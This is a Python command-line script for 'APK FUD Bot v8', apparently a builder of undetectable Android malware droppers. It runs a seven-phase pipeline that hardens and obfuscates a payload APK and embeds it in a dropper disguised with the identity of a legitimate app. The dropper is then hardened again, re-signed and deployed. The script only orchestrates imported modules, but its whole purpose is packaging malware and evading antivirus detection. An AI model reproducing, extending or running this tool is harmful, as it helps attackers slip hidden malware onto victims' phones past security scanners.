#!/usr/bin/env python3
"""APK FUD Bot v8 — Terminal/CLI Mode.

Run the full pipeline from terminal without Telegram.

Usage:
  python3 cli.py build <apk>       — Run full 7-phase pipeline
  python3 cli.py status           — Show ADB, dirs, files
  python3 cli.py list             — List input/output APKs
  python3 cli.py clean            — Remove temp/output files
  python3 cli.py help             — Show help

Examples:
  python3 cli.py build input.apk
  python3 cli.py build /path/to/payload.apk
  python3 cli.py status

Environment:
  ANDROID_DEVICE_IP    — Android device IP for ADB (optional)
  ANDROID_DEVICE_PORT  — ADB port (default 5555)
"""
import os, sys, shutil, asyncio, time
from pathlib import Path

# Add current dir to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import INPUT_DIR, OUTPUT_DIR, TEMP_DIR, CLONE_DIR, ANDROID_DEVICE_IP, ANDROID_DEVICE_PORT
from utils.logger import setup_logger
from utils.adb_helper import adb_connect

import phases.phase0_extract
import phases.phase1_payload_hardening
import phases.phase2_dropper_edits
import phases.phase3_identity_embed
import phases.phase4_dropper_hardening
import phases.phase5_pc_pipeline
import phases.phase6_final_sign
import phases.phase7_deploy

logger = setup_logger()


def _fmt_time(secs):
    if secs < 60:
        return f"{int(secs)}s"
    return f"{int(secs // 60)}m {int(secs % 60)}s"


async def run_pipeline(apk_path, verbose=True):
    """Run the exact 7-phase pipeline in terminal."""
    start_time = time.time()

    # Clean temp
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    def log(msg):
        if verbose:
            ts = time.strftime("%H:%M:%S")
            print(f"[{ts}] {msg}")

    log("")
    log("=" * 60)
    log("APK FUD Bot v8 — Terminal Mode")
    log("=" * 60)
    log(f"Input: {apk_path}")
    log("")

    # Connect ADB if configured
    if ANDROID_DEVICE_IP:
        log(f"[*] Connecting to Android device: {ANDROID_DEVICE_IP}:{ANDROID_DEVICE_PORT}")
        try:
            adb_connect(ANDROID_DEVICE_IP)
            log("[+] ADB connected — using REAL Android tools")
        except Exception as e:
            log(f"[!] ADB connection failed: {e}")
            log("[*] Falling back to PC-only mode (weaker protection)")
    else:
        log("[!] No Android device configured")
        log("[*] Running PC-only mode (weaker protection)")
        log("[*] Set ANDROID_DEVICE_IP for full protection")

    try:
        # Phase 0
        log("")
        log("[*] Phase 0: Extract Properties")
        base_info = phases.phase0_extract.run(apk_path)
        log(f"[+] Package: {base_info.get('name', 'unknown')}")
        log(f"[+] Version: {base_info.get('versionCode', 'unknown')}")

        # Phase 1
        log("")
        log("[*] Phase 1: Payload Hardening")
        log("    (NP Manager on Android, or PC stubs if no device)")
        output_apk = phases.phase1_payload_hardening.run(apk_path, base_info)
        log(f"[+] Payload hardened: {os.path.basename(output_apk)}")

        # Phase 2
        log("")
        log("[*] Phase 2: Dropper Code Edits")
        dropper_ready = phases.phase2_dropper_edits.run(base_info)
        log(f"[+] Dropper ready: {os.path.basename(dropper_ready)}")

        # Phase 3
        log("")
        log("[*] Phase 3: Identity + EMBED Payload")
        dropper_embedded = phases.phase3_identity_embed.run(dropper_ready, output_apk, base_info)
        log(f"[+] Dropper embedded: {os.path.basename(dropper_embedded)}")

        # Phase 4
        log("")
        log("[*] Phase 4: Dropper Hardening")
        log("    (NP Manager on Android, or PC stubs if no device)")
        dropper_hardened = phases.phase4_dropper_hardening.run(dropper_embedded)
        log(f"[+] Dropper hardened: {os.path.basename(dropper_hardened)}")

        # Phase 5
        log("")
        log("[*] Phase 5: MT Manager ARSC Cleanup")
        log("    (MT Manager on Android, or PC patch if no device)")
        dropper_pc = phases.phase5_pc_pipeline.run(dropper_hardened, base_info)
        log(f"[+] ARSC cleaned: {os.path.basename(dropper_pc)}")

        # Phase 6
        log("")
        log("[*] Phase 6: Final Sign (V1+V2+V3)")
        dropper_final = phases.phase6_final_sign.run(dropper_pc)
        log(f"[+] Signed: {os.path.basename(dropper_final)}")

        # Phase 7
        log("")
        log("[*] Phase 7: Deploy")
        phases.phase7_deploy.run(dropper_final)
        log("[+] Deploy done")

        # Save output
        final_name = os.path.basename(apk_path)
        final_path = str(OUTPUT_DIR / final_name)
        shutil.copy(dropper_final, final_path)

        elapsed = time.time() - start_time
        log("")
        log("=" * 60)
        log("✓ BUILD COMPLETE")
        log("=" * 60)
        log(f"Output: {final_path}")
        log(f"Size: {os.path.getsize(final_path) / (1024*1024):.2f} MB")
        log(f"Time: {elapsed:.0f}s ({elapsed/60:.1f} min)")
        log("")
        log("7 Phases Complete:")
        log("  ✓ Phase 1: Payload Hardened")
        log("  ✓ Phase 2-3: Dropper + EMBED")
        log("  ✓ Phase 4-6: Hardened + Signed V1+V2+V3")
        log("  ✓ Phase 7: Deploy")
        log("")

        # Cleanup
        shutil.rmtree(TEMP_DIR, ignore_errors=True)

        return final_path

    except Exception as e:
        logger.error(f"[!] Pipeline error: {e}", exc_info=True)
        log("")
        log(f"✗ BUILD FAILED: {e}")
        shutil.rmtree(TEMP_DIR, ignore_errors=True)
        return None


def cmd_build(apk_path):
    """Build from terminal."""
    if not os.path.exists(apk_path):
        print(f"[!] APK not found: {apk_path}")
        print(f"[*] Place APK in: {INPUT_DIR}")
        sys.exit(1)

    result = asyncio.run(run_pipeline(apk_path))
    if result:
        print(f"\n✓ Success: {result}")
        sys.exit(0)
    else:
        print(f"\n✗ Failed")
        sys.exit(1)


def cmd_status():
    """Show status in terminal."""
    from utils.adb_helper import _run
    from config import ADB

    print("=" * 60)
    print("APK FUD Bot v8 — Status")
    print("=" * 60)
    print("")
    print(f"Input dir:  {INPUT_DIR}")
    print(f"Output dir: {OUTPUT_DIR}")
    print(f"Temp dir:   {TEMP_DIR}")
    print("")

    # ADB status
    adb_ok, out, err = _run([ADB, "devices"])
    devices = [l for l in out.split('\n') if '\tdevice' in l]
    if devices:
        print(f"ADB Devices: {len(devices)} connected")
        for d in devices:
            print(f"  ✓ {d.strip()}")
    else:
        print(f"ADB Devices: None connected")
        print(f"  ⚠ Running in PC-only mode (weaker protection)")
    print("")

    # Android config
    if ANDROID_DEVICE_IP:
        print(f"Device IP:  {ANDROID_DEVICE_IP}:{ANDROID_DEVICE_PORT}")
    else:
        print(f"Device IP:  Not configured")
    print("")

    # Input files
    files = list(INPUT_DIR.glob("*.apk")) if INPUT_DIR.exists() else []
    print(f"Input APKs: {len(files)}")
    for f in files:
        print(f"  - {f.name} ({f.stat().st_size / (1024*1024):.1f} MB)")
    print("")

    # Output files
    outputs = list(OUTPUT_DIR.glob("*.apk")) if OUTPUT_DIR.exists() else []
    print(f"Output APKs: {len(outputs)}")
    for f in outputs:
        print(f"  - {f.name} ({f.stat().st_size / (1024*1024):.1f} MB)")
    print("")

    print(f"Mode: {'Android + PC' if devices else 'PC-only (stubs)'}")
    print(f"Phases: 7 · Steps: 50 · Anti-layers: 20")
    print("=" * 60)


def cmd_list():
    """List input/output APKs."""
    print("Input APKs:")
    files = list(INPUT_DIR.glob("*.apk")) if INPUT_DIR.exists() else []
    if files:
        for f in sorted(files):
            print(f"  {f.name:40s} {f.stat().st_size / (1024*1024):6.1f} MB")
    else:
        print("  (none)")

    print("")
    print("Output APKs:")
    outputs = list(OUTPUT_DIR.glob("*.apk")) if OUTPUT_DIR.exists() else []
    if outputs:
        for f in sorted(outputs):
            print(f"  {f.name:40s} {f.stat().st_size / (1024*1024):6.1f} MB")
    else:
        print("  (none)")


def cmd_clean():
    """Clean temp and output directories."""
    import glob
    for pattern in [str(TEMP_DIR / "*"), str(OUTPUT_DIR / "*.apk")]:
        for f in glob.glob(pattern):
            try:
                if os.path.isfile(f):
                    os.remove(f)
                elif os.path.isdir(f):
                    shutil.rmtree(f)
            except Exception:
                pass
    print("✓ Cleaned temp and output directories")


def cmd_help():
    """Show CLI help."""
    print("""
APK FUD Bot v8 — Terminal Commands

Usage:
  python3 cli.py [command] [options]

Commands:
  build <apk>       Run full 7-phase pipeline on APK
  status            Show ADB connection, dirs, files
  list              List input and output APKs
  clean             Remove temp and output files
  help              Show this help

Examples:
  python3 cli.py build input.apk
  python3 cli.py build /path/to/payload.apk
  python3 cli.py status
  python3 cli.py list
  python3 cli.py clean

Environment Variables:
  ANDROID_DEVICE_IP    — Android device IP for ADB
  ANDROID_DEVICE_PORT  — ADB port (default 5555)

Modes:
  With Android device  → Full protection (Dex2C, VM, CF5.0)
  Without device       → PC stubs only (weaker protection)

Pipeline:
  Phase 0: Extract properties (aapt)
  Phase 1: NP Manager hardening (Android PRIMARY)
  Phase 2: Dropper code edits (PC)
  Phase 3: Embed payload + identity (PC)
  Phase 4: NP Manager hardening dropper (Android PRIMARY)
  Phase 5: MT Manager ARSC cleanup (Android PRIMARY)
  Phase 6: Final sign V1+V2+V3 (Android PRIMARY)
  Phase 7: Deploy (PC)
""")


def main():
    # Ensure directories exist
    for d in [INPUT_DIR, OUTPUT_DIR, TEMP_DIR, CLONE_DIR]:
        d.mkdir(parents=True, exist_ok=True)

    if len(sys.argv) < 2:
        cmd_help()
        sys.exit(1)

    cmd = sys.argv[1].lower()

    if cmd in ('build', 'dropper', 'fud'):
        if len(sys.argv) < 3:
            print("Usage: python3 cli.py build <apk_file>")
            sys.exit(1)
        apk = sys.argv[2]
        cmd_build(apk)

    elif cmd == 'status':
        cmd_status()

    elif cmd == 'list':
        cmd_list()

    elif cmd == 'clean':
        cmd_clean()

    elif cmd in ('help', '-h', '--help'):
        cmd_help()

    else:
        print(f"Unknown command: {cmd}")
        cmd_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
